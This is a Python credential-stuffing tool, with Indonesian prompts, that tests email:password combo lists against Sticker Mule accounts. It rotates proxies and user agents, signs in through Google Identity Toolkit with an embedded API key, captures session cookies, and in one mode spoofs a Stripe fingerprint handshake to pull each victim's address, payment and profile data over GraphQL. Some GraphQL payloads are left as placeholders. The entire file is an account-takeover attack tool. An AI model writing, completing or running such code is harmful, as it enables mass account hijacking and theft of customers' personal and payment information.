import requests
import time
import re
import random
import os
import string
import base64
import uuid
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from colorama import init, Fore
from itertools import cycle

init(autoreset=True)

# ==== Global Counter & Lock ====
counter_lock = Lock()
progress_count = 0
live_paid = 0
live_free = 0
live_exp = 0
LOG_DIR = "log"

# ==== Utility Functions ====
def ensure_log_dir():
    os.makedirs(LOG_DIR, exist_ok=True)

def random_session(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def random_guid():
    return str(uuid.uuid4())

def get_random_ua():
    uas = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
    ]
    return random.choice(uas)

class ProxyManager:
    def __init__(self, proxy_list):
        self.proxies = proxy_list[:]
        random.shuffle(self.proxies)
        self.proxy_cycle = cycle(self.proxies) if self.proxies else None
        self.lock = Lock()

    def get_next_proxy(self):
        if not self.proxy_cycle:
            return None
        with self.lock:
            return next(self.proxy_cycle)

    def format_proxy(self, proxy):
        if "<SESSION>" in proxy:
            proxy = proxy.replace("<SESSION>", random_session())
        if proxy.startswith(("http://","https://","socks5://","socks4://")):
            return {"http": proxy, "https": proxy}
        parts = proxy.split(":")
        if len(parts) == 2:
            return {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        if len(parts) == 4:
            ip, port, user, pwd = parts
            return {"http": f"http://{user}:{pwd}@{ip}:{port}", "https": f"http://{user}:{pwd}@{ip}:{port}"}
        return {"http": f"http://{proxy}", "https": f"http://{proxy}"}

# ==== File Loader ====
def generate_combos(combo_file):
    try:
        with open(combo_file, "r", encoding="utf-8") as f:
            for idx, line in enumerate(f, 1):
                line = line.strip()
                if ":" not in line:
                    continue
                email, pwd = line.split(":", 1)
                if not email or not pwd:
                    print(Fore.YELLOW + f"[SKIP] Combo baris {idx} invalid: {line}")
                    continue
                yield email, pwd
    except FileNotFoundError:
        print(Fore.RED + f"File combo '{combo_file}' tidak ditemukan.")
        return


def load_proxies(proxy_file):
    proxies = []
    try:
        with open(proxy_file, "r") as f:
            for line in f:
                p = line.strip()
                if p:
                    proxies.append(p)
    except Exception as e:
        print(Fore.RED + f"Error read proxy file: {e}")
    return proxies

# ==== Mode 1: Website Checker ====
def check_account_website(email, password, out_file, free_file, exp_file, proxy_mgr=None, delay_sec=5):
    ensure_log_dir()
    session = requests.Session()
    if proxy_mgr:
        proxy = proxy_mgr.get_next_proxy()
        session.proxies.update(proxy_mgr.format_proxy(proxy))
    headers = {"User-Agent": get_random_ua(), "Content-Type": "application/json"}
    # login
    login_url = "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=AIzaSyA4hyayiHs97g99Nz4O0FHH0RZJhY87TKU"
    payload = {"email": email, "password": password, "returnSecureToken": True}
    try:
        resp = session.post(login_url, json=payload, headers=headers, timeout=15)
        resp.raise_for_status()
    except Exception as e:
        print(Fore.RED + f"[MODE1][DIE] {email}:{password} - {e}")
        return False
    id_token = resp.json().get("idToken", "")
    # get cookie
    cookie_url = "https://www.stickermule.com/session-cookie"
    session.post(cookie_url, json={"idToken": id_token}, headers=headers, timeout=15)
    auth_cookie = session.cookies.get("auth-stickermule_com")
    # profile
    profile_url = "https://identitytoolkit.googleapis.com/v1/accounts:lookup?key=AIzaSyA4hyayiHs97g99Nz4O0FHH0RZJhY87TKU"
    profile_resp = session.post(profile_url, json={"idToken": id_token}, headers=headers, timeout=15)
    profile = profile_resp.json()
    # output result
    print(Fore.GREEN + f"[MODE1][LIVE] {email} | cookie={auth_cookie} | profile={profile}")
    time.sleep(delay_sec)
    return True

# ==== Mode 2: GraphQL Checker ====
def check_account_graphql(email, password, proxy_mgr=None, delay_sec=5):
    session = requests.Session()
    if proxy_mgr:
        proxy = proxy_mgr.get_next_proxy()
        session.proxies.update(proxy_mgr.format_proxy(proxy))
    headers = {"User-Agent": get_random_ua(), "Content-Type": "application/json"}
    # login
    login_url = "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=AIzaSyA4hyayiHs97g99Nz4O0FHH0RZJhY87TKU"
    payload = {"email": email, "password": password, "returnSecureToken": True}
    resp = session.post(login_url, json=payload, headers=headers, timeout=15)
    if resp.status_code != 200:
        print(Fore.RED + f"[MODE2][DIE] {email}:{password} login gagal ({resp.status_code})")
        return None
    id_token = resp.json().get("idToken", "")
    # cookie
    cookie_url = "https://www.stickermule.com/session-cookie"
    session.post(cookie_url, json={"idToken": id_token}, headers=headers, timeout=15)
    auth_cookie = session.cookies.get("auth-stickermule_com")
    if not auth_cookie:
        print(Fore.RED + "[MODE2][ERROR] auth-cookie tidak ditemukan.")
        return None
    # stripe handshake
    stripe_url = "https://m.stripe.com/6"
    guid = random_guid()
    payload_b64 = "JTdCJTIydjIlMjIlM0ExJTJDJTIyaWQlMjIlM0ElMjI3ODRmZWE1ZTUwN2Q1ZDA4MjhlODNlNzc4ODc3YWU3ZSUyMiUyQyUyMnQlMjIlM0E3NyUyQyUyMnRhZyUyMiUzQSUyMiUyNG5wbV9wYWNrYWdlX3ZlcnNpb24lMjIlMkMlMjJzcmMlMjIlM0ElMjJqcyUyMiUyQyUyMmElMjIlM0FudWxsJTJDJTIyYiUyMiUzQSU3QiUyMmElMjIlM0ElMjJodHRwcyUzQSUyRiUyRlhfdldPcFlRdzJ5aW1QemEybGRpbHNzWjFWZ2xBaDZWM2h4a1RUY2ttMTQuTnpQTjE2aHB0Mk1IS3RPV1JPcjBrWTg4S096MWFVRUFWR2ZDeUpOSFY0cy5nMnU5LWhxWnZHSXFZSmNQbFBmd0pBZi12M1JneUtfeDFOcHB6QWxBMTJNJTJGJTIyJTJDJTIyYiUyMiUzQSUyMmh0dHBzJTNBJTJGJTJGWF92V09wWVF3MnlpbVB6YTJsZGlsc3NaMVZnbEFoNlYzaHhrVFRja20xNC5OelBOMTZocHQyTUhLdE9XUk9yMGtZODhLT3oxYVVFQVZHZkN5Sk5IVjRzLmcydTktaHFadkdJcVlKY1BsUGZ3SkFmLXYzUmd5S194MU5wcHpBbEExMk0lMkZyTDVsX0h2Z2lzbm9MaXdOZ0JNUElkQ0pDa2ZLV0NZT1MwLTNxSVJjcU9RJTJGVzJHRHljV0dqdUxacnRBR2UzQ3dYZ0hhNV9ET3JXWFFBZU1MTVRHMzZOZyUyMiUyQyUyMmMlMjIlM0ElMjJvSGFtMTROaENYbFlQSFloMW0yVXFHZ0FxNE9peEs4NXJ5MkoxbDJCb3YwJTIyJTJDJTIyZCUyMiUzQSUyMmRkMTIxNjNlLTdhODgtNDNkNi05YTViLTIyZWU3NGI5MDFkNWE1NDU4ZiUyMiUyQyUyMmUlMjIlM0ElMjIzYTA2NzY0Mi05MzFjLTQ0YzctOTAwMi00Y2MyMWE0NjY5NzE0YTY1MDglMjIlMkMlMjJmJTIyJTNBZmFsc2UlMkMlMjJnJTIyJTNBdHJ1ZSUyQyUyMmglMjIlM0F0cnVlJTJDJTIyaSUyMiUzQSU1QiUyMmxvY2F0aW9uJTIyJTJDJTIyZXZhbHVhdGUlMjIlMkMlMjJ3cml0ZSUyMiUyQyUyMndyaXRlbG4lMjIlMkMlMjJjcmVhdGVSYW5nZSUyMiU1RCUyQyUyMmolMjIlM0ElNUIlNUQlMkMlMjJuJTIyJTNBMTU5Mi4xMDAwMDAwMDAwOTMxJTJDJTIydSUyMiUzQSUyMnd3dy5zdGlja2VybXVsZS5jb20lMjIlMkMlMjJ2JTIyJTNBJTIyd3d3LnN0aWNrZXJtdWxlLmNvbSUyMiUyQyUyMnclMjIlM0ElMjIxNzQ5OTg3ODg4MzYwJTNBZGFmMjY5ZTdkYzVkYzhiZmYxMTBiNmI5MWRlNGRhMGI5NmExNTNkOTZmMGQ2ZmZmN2Y2NjY0NGEzODczOTQ3NSUyMiU3RCUyQyUyMmglMjIlM0ElMjIzMDdiMmM3NTE1ZWZmYWNlMThlMiUyMiU3RA=="
    stripe_payload = base64.b64decode(payload_b64)
    stripe_headers = {
        "Host": "m.stripe.com",
        "Cookie": f"m={guid}",
        "Content-Length": str(len(stripe_payload)),
        "User-Agent": get_random_ua(),
        "Content-Type": "text/plain;charset=UTF-8",
    }
    stripe_resp = session.post(stripe_url, data=stripe_payload, headers=stripe_headers)
    try:
        js = stripe_resp.json()
        muid, sid, guid2 = js.get("muid",""), js.get("sid",""), js.get("guid","")
    except:
        print(Fore.RED + "[MODE2][ERROR] parse Stripe JSON gagal.")
        return None
    # GraphQL session
    s = requests.Session()
    s.headers.update({
        "User-Agent": get_random_ua(),
        "Content-Type": "application/json",
        "Origin": "https://www.stickermule.com",
        "Referer": "https://www.stickermule.com/",
    })
    s.cookies.update({
        "auth-stickermule_com": auth_cookie,
        "__stripe_mid": muid,
        "__stripe_sid": sid,
        "guid": guid2,
    })
    graphql_url = "https://www.stickermule.com/bridge/backend/graphql"
    # Payloads
    payload_address = { ... }  # sesuai snippet di atas
    payload_payment = { ... }
    payload_profile = { ... }
    # execute and collect
    result = {}
    for name, pl in [("address",payload_address),("payment",payload_payment),("profile",payload_profile)]:
        try:
            r = s.post(graphql_url, json=pl, timeout=15)
            result[name] = r.json()
        except:
            result[name] = None
    print(Fore.GREEN + f"[MODE2][LIVE] {email} | Data={json.dumps(result)}")
    time.sleep(delay_sec)
    return result

# ==== Banner/Input ====  
def banner_input_step():
    print(Fore.MAGENTA + "Pilih mode checker: 1=Website, 2=GraphQL (default 1)")
    mode = input("> ").strip() or "1"
    mode = int(mode) if mode.isdigit() and mode in ["1","2"] else 1
    # threads
    max_threads = int(input("Jumlah thread (misal 5): ") or "5")
    combo_file = input("File combo (default combolist.txt): ").strip() or "combolist.txt"
    output_file = input("File output PAID (default paid.txt): ").strip() or "paid.txt"
    free_file = input("File output FREE (default free.txt): ").strip() or "free.txt"
    proxy_choice = input("Gunakan proxy? (y/n): ").strip().lower() == 'y'
    proxy_file = input("File proxy (default proxy.txt): ").strip() or "proxy.txt"
    delay_sec = int(input("Delay per akun (detik, default 5): ") or "5")
    return mode, max_threads, combo_file, output_file, free_file, proxy_choice, proxy_file, delay_sec

# ==== Main ====  
def main():
    mode, max_threads, combo_file, output_file, free_file, use_proxy, proxy_file, delay_sec = banner_input_step()
    proxy_mgr = ProxyManager(load_proxies(proxy_file)) if use_proxy else None
    ensure_log_dir()
    print(Fore.MAGENTA + f"Mode: {mode}. Mulai pengecekan...")
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = []
        for email, pwd in generate_combos(combo_file):
            if mode == 1:
                futures.append(executor.submit(check_account_website, email, pwd, output_file, free_file, "exp.txt", proxy_mgr, delay_sec))
            else:
                futures.append(executor.submit(check_account_graphql, email, pwd, proxy_mgr, delay_sec))
        for f in as_completed(futures):
            pass
    print(Fore.GREEN + "=== SEMUA SELESAI ===")

if __name__ == "__main__":
    main()
